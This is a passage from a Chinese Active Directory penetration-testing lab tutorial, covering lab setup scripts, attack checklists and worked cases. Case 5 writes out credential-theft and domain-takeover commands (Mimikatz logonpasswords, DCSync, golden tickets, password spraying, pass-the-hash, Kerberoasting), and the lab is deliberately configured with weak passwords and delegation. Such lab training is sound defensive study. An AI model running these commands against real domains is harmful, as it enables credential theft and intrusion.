- 创建OU和组结构
- 随机设置用户属性
- 配置随机的组成员关系
- 生成真实感的域环境

**使用方法**：

```powershell
# 下载BadBlood
git clone https://github.com/davidprowe/BadBlood.git

# 进入目录
cd BadBlood

# 运行（在域控上以管理员身份运行）
.\Invoke-BadBlood.ps1

# 或者使用参数
.\Invoke-BadBlood.ps1 -UserCount 100 -GroupCount 20 -ComputerCount 10
```

### 5.3 AutomatedLab

AutomatedLab是一个强大的实验室自动化框架，可以自动化部署复杂的Windows/Linux实验室环境。

**项目地址**：https://github.com/AutomatedLab/AutomatedLab

**功能**：
- 支持Hyper-V、VMware、Azure
- 一键部署多台虚拟机
- 自动配置域、集群、Exchange等
- 支持自定义角色和配置
- 适合快速搭建复杂环境

### 5.4 GOAD

GOAD（Game Of Active Directory）是一个专门用于域渗透练习的自动化搭建项目，使用Vagrant + Ansible自动化部署。

**项目地址**：https://github.com/Orange-Cyberdefense/GOAD

**特点**：
- 多域林环境
- 预置大量漏洞场景
- 自动化部署
- 涵盖各种域渗透技术
- 详见下一章GOAD靶场介绍

---

## 六、域渗透测试练习清单

搭建好环境后，可以按照以下清单系统练习域渗透技术。

### 6.1 信息收集类

| 练习项目 | 目标 | 工具/方法 |
|----------|------|-----------|
| 域用户枚举 | 获取所有域用户列表 | net user /domain、PowerView、BloodHound |
| 域组枚举 | 获取所有域组及成员 | net group /domain、PowerView |
| 域计算机枚举 | 获取所有域内计算机 | net view、PowerView、fscan |
| 域控定位 | 找到域控的IP和主机名 | net time、nltest、nslookup |
| SPN枚举 | 找到所有服务主体名称 | setspn、PowerView、Rubeus |
| 管理员会话探测 | 找到域管登录的机器 | psloggedon、PowerView |
| OU结构收集 | 获取OU层级结构 | PowerView、AD模块 |
| GPO收集 | 获取所有组策略对象 | PowerView、Get-GPO |
| ACL收集 | 获取对象的ACL权限 | PowerView、BloodHound |
| 信任关系收集 | 获取域/林信任关系 | nltest、PowerView |

### 6.2 凭据获取类

| 练习项目 | 目标 | 工具/方法 |
|----------|------|-----------|
| 本地密码哈希 | 导出本地SAM哈希 | Mimikatz、reg save |
| 域凭据抓取 | 抓取内存中的域用户密码 | Mimikatz、sekurlsa |
| LSA密码 | 导出LSA中的密码 | Mimikatz、lsadump |
| 明文密码 | 获取明文密码 | Mimikatz sekurlsa::logonpasswords |
| NTLM哈希 | 获取NTLM哈希 | Mimikatz、impacket-secretsdump |
| Kerberos票据 | 导出内存中的票据 | Mimikatz、Rubeus |
| 浏览器密码 | 导出浏览器保存的密码 | Lazagne、mimikittenz |
| 凭据管理器 | 导出Windows凭据管理器 | Mimikatz、cmdkey |

### 6.3 横向移动类

| 练习项目 | 目标 | 工具/方法 |
|----------|------|-----------|
| 密码喷洒 | 用密码批量测试用户 | CrackMapExec、DomainPasswordSpray |
| 哈希传递（PtH） | 使用NTLM哈希登录 | Mimikatz、impacket-psexec、CME |
| 票据传递（PtT） | 使用Kerberos票据登录 | Mimikatz、Rubeus |
| WMI执行 | 通过WMI执行命令 | impacket-wmiexec、wmiexec.vbs |
| SMB执行 | 通过SMB执行命令 | impacket-psexec、smbexec |
| WinRM执行 | 通过WinRM执行命令 | evil-winrm、WinRS |
| 远程桌面 | 远程桌面登录 | mstsc、xfreerdp |
| DCOM执行 | 通过DCOM执行命令 | DCOM命令执行工具 |
| SSH登录 | 通过SSH登录 | ssh、plink |
| MSSQL登录 | 通过MSSQL执行命令 | impacket-mssqlclient、SQLTools |

### 6.4 域渗透攻击类

| 练习项目 | 目标 | 工具/方法 |
|----------|------|-----------|
| AS-REP Roasting | 获取启用了"不需要预身份验证"的用户哈希 | Rubeus、impacket-GetNPUsers |
| Kerberoasting | 获取服务账号票据并破解 | Rubeus、impacket-GetUserSPNs |
| 白银票据 | 伪造服务票据 | Mimikatz、Rubeus |
| 黄金票据 | 伪造TGT票据 | Mimikatz、Rubeus |
| 非约束委派攻击 | 利用非约束委派获取TGT | Mimikatz、Rubeus |
| 约束委派攻击 | 利用约束委派模拟用户 | Rubeus、impacket |
| 资源型约束委派 | 利用资源型约束委派 | Rubeus、impacket |
| DCSync | 模拟域控同步获取所有哈希 | Mimikatz、impacket-secretsdump |
| DCShadow | 模拟域控注入数据 | Mimikatz |
| 域信任攻击 | 利用域信任关系攻击 | Mimikatz、Rubeus |
| 林攻击 | 跨林攻击 | Mimikatz、Rubeus |
| ACL攻击 | 利用ACL权限提升 | PowerView、BloodHound |

### 6.5 权限维持类

| 练习项目 | 目标 | 工具/方法 |
|----------|------|-----------|
| 黄金票据 | 注入黄金票据维持权限 | Mimikatz、Rubeus |
| 白银票据 | 注入白银票据访问服务 | Mimikatz、Rubeus |
| ACL后门 | 配置ACL后门 | PowerView、Add-DomainObjectAcl |
| DSRM后门 | DSRM账户后门 | Mimikatz、注册表修改 |
| 计划任务 | 创建计划任务后门 | schtasks、cron |
| 服务后门 | 创建恶意服务 | sc、PowerShell |
| WMI事件订阅 | WMI永久事件订阅 | wmic、PowerShell |
| 注册表后门 | 粘滞键、辅助功能 | reg add |
| 隐藏用户 | 创建隐藏用户账户 | net user、注册表 |
| SPN后门 | 配置SPN后门 | setspn、PowerView |
| 组策略后门 | 通过GPO下发后门 | 组策略管理 |

---

## 七、实战案例

### 案例1：域控搭建实战

**场景**：从零开始搭建一台Windows Server 2019域控。

**操作步骤**：

1. **创建虚拟机**
   - 新建虚拟机，2核CPU，2GB内存，60GB硬盘
   - 挂载Windows Server 2019 ISO
   - 网络设置为仅主机模式

2. **安装系统**
   - 选择Windows Server 2019 Standard（桌面体验）
   - 设置管理员密码：Admin@123
   - 完成系统安装

3. **基础配置**
```powershell
# 修改计算机名
Rename-Computer -NewName "DC01"

# 配置静态IP
$ifIndex = (Get-NetAdapter).InterfaceIndex
New-NetIPAddress -IPAddress 192.168.10.10 -PrefixLength 24 -InterfaceIndex $ifIndex
Set-DnsClientServerAddress -InterfaceIndex $ifIndex -ServerAddresses "127.0.0.1"

# 重启
Restart-Computer
```

4. **安装AD DS**
```powershell
# 安装角色
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# 提升为域控
$password = ConvertTo-SecureString "DSRM@123" -AsPlainText -Force
Install-ADDSForest -DomainName "testlab.local" -DomainNetbiosName "TESTLAB" -ForestMode WinThreshold -DomainMode WinThreshold -InstallDns -SafeModeAdministratorPassword $password -Force
```

5. **验证安装**
```powershell
# 验证域
Get-ADDomain

# 验证DNS
nslookup testlab.local
ping testlab.local
```

**经验总结**：搭建域控的关键步骤是正确配置IP和DNS，然后安装AD DS角色并提升为域控。注意安装过程中会自动重启。

---

### 案例2：域用户和组管理

**场景**：在域中创建OU结构、用户和组。

**操作步骤**：

1. **创建OU结构**
```powershell
# 创建公司根OU
New-ADOrganizationalUnit -Name "公司" -Path "DC=testlab,DC=local"

# 创建部门OU
$departments = @("技术部", "人事部", "财务部", "市场部", "运维部")
foreach ($dept in $departments) {
    New-ADOrganizationalUnit -Name $dept -Path "OU=公司,DC=testlab,DC=local"
}

# 创建服务器和客户端OU
New-ADOrganizationalUnit -Name "服务器" -Path "OU=公司,DC=testlab,DC=local"
New-ADOrganizationalUnit -Name "客户端" -Path "OU=公司,DC=testlab,DC=local"
```

2. **创建用户组**
```powershell
# 技术部组
New-ADGroup -Name "技术部-全体" -SamAccountName "Tech_All" -GroupCategory Security -GroupScope Global -Path "OU=技术部,OU=公司,DC=testlab,DC=local"
New-ADGroup -Name "技术部-主管" -SamAccountName "Tech_Lead" -GroupCategory Security -GroupScope Global -Path "OU=技术部,OU=公司,DC=testlab,DC=local"

# 运维部组
New-ADGroup -Name "运维部-全体" -SamAccountName "Ops_All" -GroupCategory Security -GroupScope Global -Path "OU=运维部,OU=公司,DC=testlab,DC=local"
New-ADGroup -Name "服务器管理员" -SamAccountName "ServerAdmins" -GroupCategory Security -GroupScope Global -Path "OU=运维部,OU=公司,DC=testlab,DC=local"
```

3. **批量创建用户**
```powershell
$password = ConvertTo-SecureString "Pass@123" -AsPlainText -Force

# 技术部用户
$techUsers = @(
    @{Name="张三"; Sam="zhangsan"},
    @{Name="李四"; Sam="lisi"},
    @{Name="王五"; Sam="wangwu"}
)

foreach ($user in $techUsers) {
    New-ADUser -Name $user.Name -SamAccountName $user.Sam -UserPrincipalName "$($user.Sam)@testlab.local" -Path "OU=技术部,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true
    Add-ADGroupMember -Identity "Tech_All" -Members $user.Sam
}

# 将第一个用户设为技术部主管
Add-ADGroupMember -Identity "Tech_Lead" -Members "zhangsan"
```

4. **验证用户和组**
```powershell
# 查看所有用户
Get-ADUser -Filter * | Select-Object Name,SamAccountName

# 查看组成员
Get-ADGroupMember -Identity "Tech_All"

# 查看用户所属组
Get-ADPrincipalGroupMembership zhangsan | Select-Object Name
```

**经验总结**：批量管理用户和组时，使用PowerShell脚本比图形界面高效得多。建议用脚本管理，便于记录和复用。

---

### 案例3：SPN配置

**场景**：配置Kerberoasting攻击所需的SPN服务账号。

**操作步骤**：

1. **创建服务账号**
```powershell
$password = ConvertTo-SecureString "SvcPass@123" -AsPlainText -Force

# 创建Web服务账号
New-ADUser -Name "Web Service" -SamAccountName "websvc" -UserPrincipalName "websvc@testlab.local" -Path "OU=服务器,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true -ServicePrincipalNames @()

# 创建SQL服务账号
New-ADUser -Name "SQL Service" -SamAccountName "sqlsvc" -UserPrincipalName "sqlsvc@testlab.local" -Path "OU=服务器,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true -ServicePrincipalNames @()

# 创建文件服务账号
New-ADUser -Name "File Service" -SamAccountName "filesvc" -UserPrincipalName "filesvc@testlab.local" -Path "OU=服务器,OU=公司,DC=testlab,DC=local" -AccountPassword $password -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true
```

2. **注册SPN**
```powershell
# Web服务SPN
setspn -S HTTP/web01.testlab.local websvc
setspn -S HTTP/www.testlab.local websvc

# SQL服务SPN
setspn -S MSSQLSvc/web01.testlab.local:1433 sqlsvc
setspn -S MSSQLSvc/web01.testlab.local sqlsvc

# 文件服务SPN
setspn -S CIFS/web01.testlab.local filesvc

# 验证SPN
setspn -L websvc
setspn -L sqlsvc
```

3. **模拟Kerberoasting攻击验证**
```bash
# 使用impacket工具请求服务票据
# 在Kali攻击机上执行
impacket-GetUserSPNs testlab.local/zhangsan:Pass@123 -dc-ip 192.168.10.10 -request

# 保存哈希后离线破解
hashcat -m 13100 hash.txt wordlist.txt
```

**经验总结**：Kerberoasting是域渗透中非常实用的攻击技术，因为服务账号往往设置了较弱的密码，且长期不变。在真实环境中，破解服务账号密码的成功率很高。

---

### 案例4：委派配置

**场景**：配置非约束委派和约束委派场景。

**操作步骤**：

1. **配置非约束委派**
```powershell
# 给WEB01计算机配置非约束委派
Set-ADComputer -Identity WEB01 -TrustedForDelegation $true

# 验证
Get-ADComputer -Identity WEB01 -Properties TrustedForDelegation

# 查找所有配置了非约束委派的计算机
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

2. **配置约束委派**
```powershell
# 允许websvc用户委派到MSSQL服务
# 首先确保目标服务有SPN
setspn -S MSSQLSvc/web01.testlab.local:1433 sqlsvc

# 配置约束委派
Set-ADUser -Identity websvc -TrustedToAuthForDelegation $true
Set-ADUser -Identity websvc -ServicePrincipalNames @{Add="HTTP/web01.testlab.local"}

# 设置允许委派到的服务
$allowedServices = @("MSSQLSvc/web01.testlab.local:1433")
Set-ADUser -Identity websvc -Add @{"msDS-AllowedToDelegateTo"=$allowedServices}
```

3. **配置资源型约束委派**
```powershell
# 允许zhangsan用户对WEB01进行资源型约束委派
$user = Get-ADUser -Identity zhangsan
Set-ADComputer -Identity WEB01 -PrincipalsAllowedToDelegateToAccount $user

# 验证
Get-ADComputer -Identity WEB01 -Properties PrincipalsAllowedToDelegateToAccount
```

4. **验证委派攻击**
```bash
# 使用Rubeus进行非约束委派攻击
# 先获取WEB01的计算机账户哈希
# 然后使用该账户的TGS获取用户TGT

# 约束委派攻击
Rubeus.exe s4u /user:websvc /rc4:<NTLM哈希> /msdsspn:MSSQLSvc/web01.testlab.local /impersonateuser:administrator /ptt
```

**经验总结**：委派攻击是域渗透中的高级技术，需要理解Kerberos协议的工作原理。通过亲手配置各种委派场景，可以更深入地理解攻击原理。

---

### 案例5：域渗透练习

**场景**：使用自己搭建的域环境进行完整的域渗透练习。

**练习流程**：

1. **信息收集阶段**
```bash
# 从WEB01开始（假设已经通过Web漏洞拿到Shell）
# 收集域信息
net user /domain
net group "Domain Admins" /domain
net view /domain:testlab

# 收集SPN
setspn -Q */*

# 查找域控
nltest /dclist:testlab.local
net time /domain
```

2. **凭据获取阶段**
```bash
# 抓取本地凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 收集到的凭据可能包含域用户密码
```

3. **横向移动阶段**
```bash
# 用收集到的凭据尝试登录其他机器
# 密码喷洒
cme smb 192.168.10.0/24 -u users.txt -p passwords.txt -d testlab.local

# 哈希传递
impacket-psexec -hashes :<NTLM> testlab/zhangsan@192.168.10.100
```

4. **域渗透阶段**
```bash
# Kerberoasting
impacket-GetUserSPNs testlab.local/zhangsan:Pass@123 -dc-ip 192.168.10.10 -request

# 破解服务账号密码
# 如果服务账号是高权限用户，直接用它登录域控

# AS-REP Roasting
impacket-GetNPUsers testlab.local/ -usersfile users.txt -outputfile asrep.txt
```

5. **拿下域控**
```bash
# 方法1：用域管密码登录
impacket-wmiexec testlab/administrator:AdminPass@192.168.10.10

# 方法2：DCSync
mimikatz "lsadump::dcsync /domain:testlab.local /all /csv" "exit"

# 方法3：黄金票据
# 获取krbtgt哈希后制作黄金票据
mimikatz "kerberos::golden /user:hacker /domain:testlab.local /sid:S-1-5-21-xxx /krbtgt:xxx /ptt" "exit"
```

6. **权限维持**
```bash
# 黄金票据
# ACL后门
# 计划任务
# ...各种维持手段
```

**经验总结**：自己搭建的域环境可以反复练习，每次尝试不同的攻击路径。建议记录每次练习的过程和结果，对比不同方法的优劣，逐步形成自己的渗透方法论。

---

## 八、练习题

### 基础题（5道）

1. **为什么要自己搭建域环境？相比使用现成的靶场，自己搭建有哪些优势？**

2. **搭建一个最小化的单域环境需要哪些虚拟机？各自的角色是什么？请画出网络拓扑图。**

3. **Active Directory中的OU、用户、组、域、林分别是什么？它们之间有什么关系？**

4. **什么是SPN？Kerberoasting攻击的原理是什么？如何配置SPN来练习Kerberoasting？**

5. **委派有哪几种类型？请分别说明非约束委派、约束委派、资源型约束委派的区别和攻击原理。**

### 进阶题（5道）

6. **请设计一个包含3台虚拟机的域渗透实验环境，详细说明每台机器的角色、IP配置、需要安装的软件和服务，并列出至少5种可以配置的漏洞场景。**

7. **请编写一个PowerShell脚本，实现一键搭建域控的功能，包括：修改计算机名、配置静态IP、安装AD DS、创建OU结构、创建用户和组、配置SPN。**

8. **ACL攻击是域渗透的重要方向，请列举至少5种常见的ACL攻击场景，并说明每种场景的利用条件和攻击方法。**

9. **请设计一个域渗透测试的练习清单，按照信息收集、凭据获取、横向移动、域渗透、权限维持五个阶段，每个阶段至少列出8个练习项目。**

10. **对比手动搭建域环境和使用GOAD等自动化工具的优缺点，分析各自适用的场景，并给出不同学习阶段的建议。**

---

## 安全提醒

> **⚠️ 重要声明**
>
> 本文档中的所有技术内容仅供学习和研究使用，仅适用于在**自己搭建的合法实验环境**中进行练习。
>
> - 请勿在未授权的任何系统上使用本文档中描述的技术
> - 请遵守《网络安全法》及相关法律法规
> - 搭建实验环境时请使用合法授权的操作系统镜像
> - 实验环境应与真实网络隔离，避免造成意外影响
> - 学习过程中请尊重他人隐私和知识产权
> - 配置漏洞场景仅用于学习和研究，不得用于非法用途
>
> 安全技术应用于防护和建设，而非攻击和破坏。请树立正确的网络安全观，做遵纪守法的白帽黑客。
